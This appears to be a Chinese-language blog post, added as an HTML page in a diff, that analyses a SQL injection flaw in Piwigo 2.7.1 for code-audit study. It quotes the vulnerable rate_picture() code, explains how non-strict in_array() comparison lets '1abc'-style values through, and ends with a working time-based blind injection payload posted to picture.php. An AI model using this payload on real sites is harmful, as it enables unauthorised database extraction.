@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>piwigo2-7-1sql注入分析 - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=sql注入,漏洞分析>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">piwigo2-7-1sql注入分析</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞入口点"><span class="toc-text">漏洞入口点</span></a></li></ol>
+
+  <div class="post-content">
+    <p>最近在看红日安全的PHP-Audit-Labs项目，这个项目每篇文章都会有对应的cms实例，感觉对代码审计的初学者来说还是很不错的</p>
+<p>简单写下自己对<a href="https://github.com/LioTree/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md" target="_blank" rel="noopener">Day1</a> 中piwigo2.7.1 sql注入的分析</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
+<li>php 的in_array函数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array( mixed $needle, <span class="keyword">array</span> $haystack[, bool $strict = <span class="keyword">FALSE</span>] ) : bool</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。 </p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同</p>
+</blockquote>
+<ul>
+<li>如果不设置strict的话很容易出现弱类型导致的安全问题 </li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞位于/include/function_rate.inc.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Rate a picture by the current user.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $image_id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> float $rate</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array as return by update_rating_score()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rate_picture</span><span class="params">($image_id, $rate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $conf, $user;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($rate)</span><br><span class="line">      <span class="keyword">or</span> !$conf[<span class="string">'rate'</span>]</span><br><span class="line">      <span class="keyword">or</span> !in_array($rate, $conf[<span class="string">'rate_items'</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $user_anonymous = is_autorize_status(ACCESS_CLASSIC) ? <span class="keyword">false</span> : <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($user_anonymous <span class="keyword">and</span> !$conf[<span class="string">'rate_anonymous'</span>])</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $ip_components = explode(<span class="string">'.'</span>, $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">  <span class="keyword">if</span> (count($ip_components) &gt; <span class="number">3</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    array_pop($ip_components);</span><br><span class="line">  &#125;</span><br><span class="line">  $anonymous_id = implode (<span class="string">'.'</span>, $ip_components);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($user_anonymous)</span><br><span class="line">  &#123;</span><br><span class="line">    $save_anonymous_id = pwg_get_cookie_var(<span class="string">'anonymous_rater'</span>, $anonymous_id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($anonymous_id != $save_anonymous_id)</span><br><span class="line">    &#123; <span class="comment">// client has changed his IP adress or he's trying to fool us</span></span><br><span class="line">      $query = <span class="string">'</span></span><br><span class="line"><span class="string">SELECT element_id</span></span><br><span class="line"><span class="string">  FROM '</span>.RATE_TABLE.<span class="string">'</span></span><br><span class="line"><span class="string">  WHERE user_id = '</span>.$user[<span class="string">'id'</span>].<span class="string">'</span></span><br><span class="line"><span class="string">    AND anonymous_id = \''</span>.$anonymous_id.<span class="string">'\'</span></span><br><span class="line"><span class="string">;'</span>;</span><br><span class="line">      $already_there = array_from_query($query, <span class="string">'element_id'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (count($already_there) &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        $query = <span class="string">'</span></span><br><span class="line"><span class="string">DELETE</span></span><br><span class="line"><span class="string">  FROM '</span>.RATE_TABLE.<span class="string">'</span></span><br><span class="line"><span class="string">  WHERE user_id = '</span>.$user[<span class="string">'id'</span>].<span class="string">'</span></span><br><span class="line"><span class="string">    AND anonymous_id = \''</span>.$save_anonymous_id.<span class="string">'\'</span></span><br><span class="line"><span class="string">    AND element_id IN ('</span>.implode(<span class="string">','</span>, $already_there).<span class="string">')</span></span><br><span class="line"><span class="string">;'</span>;</span><br><span class="line">         pwg_query($query);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $query = <span class="string">'</span></span><br><span class="line"><span class="string">UPDATE '</span>.RATE_TABLE.<span class="string">'</span></span><br><span class="line"><span class="string">  SET anonymous_id = \''</span> .$anonymous_id.<span class="string">'\'</span></span><br><span class="line"><span class="string">  WHERE user_id = '</span>.$user[<span class="string">'id'</span>].<span class="string">'</span></span><br><span class="line"><span class="string">    AND anonymous_id = \''</span> . $save_anonymous_id.<span class="string">'\'</span></span><br><span class="line"><span class="string">;'</span>;</span><br><span class="line">       pwg_query($query);</span><br><span class="line">    &#125; <span class="comment">// end client changed ip</span></span><br><span class="line"></span><br><span class="line">    pwg_set_cookie_var(<span class="string">'anonymous_rater'</span>, $anonymous_id);</span><br><span class="line">  &#125; <span class="comment">// end anonymous user</span></span><br><span class="line"></span><br><span class="line">  $query = <span class="string">'</span></span><br><span class="line"><span class="string">DELETE</span></span><br><span class="line"><span class="string">  FROM '</span>.RATE_TABLE.<span class="string">'</span></span><br><span class="line"><span class="string">  WHERE element_id = '</span>.$image_id.<span class="string">'</span></span><br><span class="line"><span class="string">    AND user_id = '</span>.$user[<span class="string">'id'</span>].<span class="string">'</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">  <span class="keyword">if</span> ($user_anonymous)</span><br><span class="line">  &#123;</span><br><span class="line">    $query.= <span class="string">' AND anonymous_id = \''</span>.$anonymous_id.<span class="string">'\''</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pwg_query($query);</span><br><span class="line">  $query = <span class="string">'</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO '</span>.RATE_TABLE.<span class="string">'</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  ('</span></span><br><span class="line">    .$user[<span class="string">'id'</span>].<span class="string">','</span></span><br><span class="line">    .<span class="string">'\''</span>.$anonymous_id.<span class="string">'\','</span></span><br><span class="line">    .$image_id.<span class="string">','</span></span><br><span class="line">    .$rate</span><br><span class="line">    .<span class="string">',NOW())</span></span><br><span class="line"><span class="string">;'</span>;</span><br><span class="line">  pwg_query($query);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> update_rating_score($image_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>该函数用于给图片评分，因此限制了分数$rate只能是$conf[‘rate_items’]中的值<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//include/config_default.inc.php</span></span><br><span class="line"><span class="comment">// rate_items: available rates for a picture</span></span><br><span class="line">$conf[<span class="string">'rate_items'</span>] = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//include/functions_rate.inc.php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($rate)</span><br><span class="line">      <span class="keyword">or</span> !$conf[<span class="string">'rate'</span>]</span><br><span class="line">      <span class="keyword">or</span> !in_array($rate, $conf[<span class="string">'rate_items'</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
+<li>但是这里的in_array()没有设置第三个参数，因此像1abc这样以数字开头的字符串会返回True</li>
+<li>$rate会被代入sql语句中执行，造成sql注入<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">'</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO '</span>.RATE_TABLE.<span class="string">'</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  ('</span></span><br><span class="line">    .$user[<span class="string">'id'</span>].<span class="string">','</span></span><br><span class="line">    .<span class="string">'\''</span>.$anonymous_id.<span class="string">'\','</span></span><br><span class="line">    .$image_id.<span class="string">','</span></span><br><span class="line">    .$rate</span><br><span class="line">    .<span class="string">',NOW())</span></span><br><span class="line"><span class="string">;'</span>;</span><br><span class="line">  pwg_query($query);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="漏洞入口点"><a href="#漏洞入口点" class="headerlink" title="漏洞入口点"></a>漏洞入口点</h2><p>全局搜索可以发现有两个地方调用了rate_picture：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//picture.php</span></span><br><span class="line">rate_picture($page[<span class="string">'image_id'</span>], $_POST[<span class="string">'rate'</span>]);</span><br><span class="line"><span class="comment">//include/ws_function/pwg.images.php</span></span><br><span class="line">$res = rate_picture($params[<span class="string">'image_id'</span>], (int)$params[<span class="string">'rate'</span>]);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>pwg.images.php进行了强制类型转换，因此无法利用</li>
+<li>只能利用picture.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'rate'</span> :</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">include_once</span>(PHPWG_ROOT_PATH.<span class="string">'include/functions_rate.inc.php'</span>);</span><br><span class="line">     rate_picture($page[<span class="string">'image_id'</span>], $_POST[<span class="string">'rate'</span>]);</span><br><span class="line">     redirect($url_self);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
+<li>要注意的是执行rate_picture后会调用redirect跳转到别的页面，因此只能利用基于时间的盲注</li>
+<li>最后的exp:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/piwigo/picture.php?/1/category/1&amp;action=rate</span><br><span class="line">post: rate=1 and if(ascii(substr(user(),1,1))=114,sleep(5),null)</span><br></pre></td></tr></table></figure>
+piwigo有全局的addslashes过滤，因此不能使用单引号等字符</li>
+</ul>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-11-29</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
